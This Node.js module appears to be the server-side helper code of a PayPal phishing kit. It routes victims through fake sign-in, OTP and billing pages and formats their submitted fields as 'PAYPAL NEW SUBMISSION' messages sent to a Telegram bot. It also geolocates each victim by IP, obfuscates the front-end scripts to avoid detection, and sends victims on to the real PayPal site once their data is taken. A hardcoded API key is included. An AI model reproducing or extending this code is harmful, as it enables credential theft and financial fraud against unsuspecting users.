import path from "path";
import fs from "fs/promises";
import axios from "axios";
import { sendMessageFor } from "simple-telegram-message";
import dotenv from "dotenv";
import JavaScriptObfuscator from "javascript-obfuscator";
import { obfuscateMultiple } from "./obfuscate.js";
import express from "express";
import session from "express-session";

function getClientIP(socket) {
  let ip = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) ip = ip.split(",")[0];
  if (ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
  return ip;
}

function getReqClientIP(req) {
  let ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress || req.socket.remoteAddress || (req.connection.socket ? req.connection.socket.remoteAddress : null);
  
  if (ip && ip.includes(",")) {
    ip = ip.split(",")[0].trim();
  }

  // Remove IPv6 prefix if present
  if (ip && ip.startsWith("::ffff:")) {
    ip = ip.replace("::ffff:", "");
  }

  return ip;
}


async function prepareObfuscatedAssets() {
  const srcDir = path.resolve("./public/js");
  const outDir = path.resolve("./public/obf-js");

  // make sure outDir exists
  await fs.mkdir(outDir, { recursive: true });

  const entries = await fs.readdir(srcDir, { withFileTypes: true });
  const jsFiles = entries.filter(e => e.isFile() && e.name.endsWith(".js")).map(e => e.name);

  for (const name of jsFiles) {
    const srcPath = path.join(srcDir, name);
    const outPath = path.join(outDir, name);
    const code = await fs.readFile(srcPath, "utf8");

    const obfuscated = JavaScriptObfuscator.obfuscate(code, {
      compact: true,
      selfDefending: true,
      disableConsoleOutput: true,
      // do NOT include invalid debugProtectionInterval values
    }).getObfuscatedCode();

    await fs.writeFile(outPath, obfuscated, "utf8");
  }
}

async function sendAPIRequest(ipAddress) {
  const response = await axios.get(`https://api-bdc.net/data/ip-geolocation?ip=${ipAddress}&localityLanguage=en&key=bdc_4422bb94409c46e986818d3e9f3b2bc2`);
  return response.data;
}

async function buildUserInfo(req, sendAPIRequest) {
  try {
    const ipAddress = getReqClientIP(req);
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];
    const geoInfo = await sendAPIRequest(ipAddress);

    const now = new Date().toISOString();

    const User_info = [
      "🌍 GEO-IP INFO",
      `IP: ${geoInfo?.ip || "Unknown"}`,
      `City: ${geoInfo?.location?.city || "Unknown"}`,
      `State: ${geoInfo?.location?.principalSubdivision || "Unknown"}`,
      `ZIP: ${geoInfo?.location?.postcode || "Unknown"}`,
      `Country: ${geoInfo?.country?.name || "Unknown"}`,
      `Time: ${geoInfo?.location?.timeZone?.localTime || "Unknown"}`,
      `ISP: ${geoInfo?.network?.organisation || "Unknown"}`,
      "",
      `User-Agent: ${userAgent || "N/A"}`,
      `Language: ${systemLang || "N/A"}`,
      `Timestamp: ${now}`
    ].join("\n");

    return User_info;

  } catch (err) {
    console.error("❌ Failed to build user info:", err);
    return `========================\n🌍 GEO-IP INFO\nError retrieving data for IP: ${req.ip}\n========================`;
  }
}

// ✅ Adjustable flow configuration
// Page flow using numeric keys (order matters)
const pageFlow = {
  1: "login",
  2: "otp",
  3: "bill",        // skipped
  4: "0",
  5: "final"
};

// Backend → frontend mapping
const routeMap = {
  login: "sign-in",
  otp: "sign-in?action=otp",
  bill: "sign-in?action=bill",
  contact: "sign-in?action=contact",
  final: "https://href.li/?https://paypal.com"
};

// Normalize strings
function normalize(str = "") {
  return str.replace(/^\//, "").trim().toLowerCase();
}

// Backend → frontend
function resolveFrontendRoute(backendPage) {
  return routeMap[backendPage] || backendPage;
}

// Frontend → backend
function resolveBackendRoute(currentPage) {
  const clean = normalize(currentPage);
  const match = Object.keys(routeMap).find(
    backendKey => normalize(routeMap[backendKey]) === clean
  );
  return match || clean;
}

// Get the next page, skipping "0"
function getNextPage(currentPage, req) {
  if (!currentPage) return null;

  const backendCurrent = resolveBackendRoute(currentPage);

  const sortedKeys = Object.keys(pageFlow)
    .map(Number)
    .sort((a, b) => a - b);

  const currentIdx = sortedKeys.findIndex(
    key => pageFlow[key] === backendCurrent
  );

  if (currentIdx === -1) return null;

  let nextPage = null;
  for (let i = currentIdx + 1; i < sortedKeys.length; i++) {
    const candidate = pageFlow[sortedKeys[i]];
    if (candidate && candidate !== "0") {
      nextPage = candidate;
      break;
    }
  }

  if (!nextPage) return null;

  const frontendRoute = resolveFrontendRoute(nextPage);

  // External URL case
  if (frontendRoute.startsWith("http://") || frontendRoute.startsWith("https://")) {
    console.log("next page:", nextPage);

    // Only update session **if req was provided**
    if (req?.session) {
      req.session.cookie.maxAge = 60 * 60 * 1000;
      req.session.blocked = true;
    }

    let normalized = frontendRoute.replace(/^\/+/, "").replace(/\/+$/, "");
    return normalized;
  }

  console.log("skip startwith :", nextPage);

  const normalizedFrontend = frontendRoute.replace(/\/+$/, "");
  return normalizedFrontend.startsWith("/")
    ? normalizedFrontend
    : `/${normalizedFrontend}`;
}


// ✅ Your buildMessage function goes here
async function buildMessage(data, options = {}) {
  const {
    sendToTelegram = false,
    botToken = null,
    chatId = null
  } = options;

  try { 
    let message = ``;
    message = `🤖 PAYPAL NEW SUBMISSION\n\n`;
    const excludeKeys = ["visitor", "userid", "security_code"];

    for (const [key, value] of Object.entries(data)) {
      const lowerKey = key.toLowerCase();
      if (value && !excludeKeys.includes(lowerKey)) {
        message += `${key.toUpperCase()}   : ${value}\n`;
      }
    }
    
    
    // ✅ Optional: send to Telegram
    if (sendToTelegram) {
    	console.log("sending to tg");
      if (!botToken || !chatId) throw new Error("Bot token or Chat ID missing");
      const sendMessage = sendMessageFor(botToken, chatId);  
      await sendMessage(message);
    }

    return message;
  } catch (err) {
    console.error("❌ buildMessage error:", err);
    return null;
  }
}

// ✅ Middleware for admin authentication
function requireAdmin(req, res, next) {
  if (req.session && req.session.isAdmin) {
    return next();
  }
  // If not logged in, always go back to /admin (login page)
  return res.redirect("/admin");
}

function blockedRedirect(db) {
  return async function (req, res, next) {

    try {
      const blockStatus = await db.get(`SELECT baSUB FROM admin_settings`);
      const blockAfterSub = !!(blockStatus && blockStatus.baSUB);

      if (blockAfterSub && req.session && req.session.blocked && !req.session.isAdmin) {
        const blockLink = routeMap.final;
        return res.redirect(blockLink);
      }

      next();
    } catch (err) {
      console.error("Error in blockedRedirect middleware:", err);
      next(err);
    }
  };
}


async function isAutopilotOn(db) {
  const row = await db.get("SELECT autopilot FROM admin_settings WHERE id = 1");
  return row?.autopilot === 1;
}

export { buildMessage, isAutopilotOn, getClientIP, getReqClientIP, getNextPage, buildUserInfo, sendAPIRequest, pageFlow, requireAdmin, blockedRedirect, resolveFrontendRoute, prepareObfuscatedAssets };